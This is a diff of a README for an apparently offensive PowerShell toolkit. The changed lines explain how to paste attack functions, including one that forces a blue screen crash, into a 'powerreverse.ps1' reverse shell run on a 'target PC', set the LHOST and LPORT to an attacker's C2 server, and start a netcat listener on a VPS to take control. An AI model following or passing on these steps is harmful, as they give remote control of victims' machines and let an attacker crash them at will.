@@ -57,21 +57,28 @@ To run this application, you'll need the powerreverse.ps1 file executed on targe
 
 ```bash
 # Install This Repository
-$ git clone 
+$ Download The Code By Pressing Download ZIP
 
 # Clone this repository
-$ git clone https://github.com/ItsCyberAli/The-Soaring-Eagle.git
+$ git clone https://github.com/ItsCyberAli/PowerMeUp.git
 
-# Navigate To The Repository Where You Installed It
-$ cd The-Soaring-Eagle/The\ Soaring\ Eagle/
+# Take One Of The Functions Like This & Copy Paste Into PowerReverse
+$ You Will See The Screenshot Below Has The PowerReverse file and inside I added the BSOD.ps1 function
+that I copy pasted inside of the powerreverse.ps1 so that we can call & use it when we execute on target PC.
+You can mix & match what features you want in the reverse shell just make sure there is no references right above the function call 
+it will say references and if it says 0 you are fine if it says 1 or more simply change the function name. When reverse shell
+executes and you want to execute a specific feature simply call the function name and in our case inside the VPS simply type bsod 
+and it will execute it or whateber you named the function!
 
-# Install The Dependencies & Requirements In Order For The Tool To Run
-$ python3 -m pip install -r requirements.txt
 
-# Run The Code & Enjoy
-$ python3 run.py
+# Change The LHOST & LPORT Inside Of The PowerReverse File
+$LHOST = "YOUR C2 IP"
+$LPORT = #Your Port Without Quotations
+
+# Start A Netcat Listener Or Your Own Implementation Of A Listener On VPS Or C2 & Enjoy!
+$ nc -l -p <port you chose> (Just A Netcat Listener In Your VPS Not Needed If You Use Another Method!)
 ```
-
+![Desktop-screenshott](https://user-images.githubusercontent.com/111126641/196741881-e7f874d2-e2c6-4486-a7d5-816cab2ee66c.png)
 
 ## Download
 
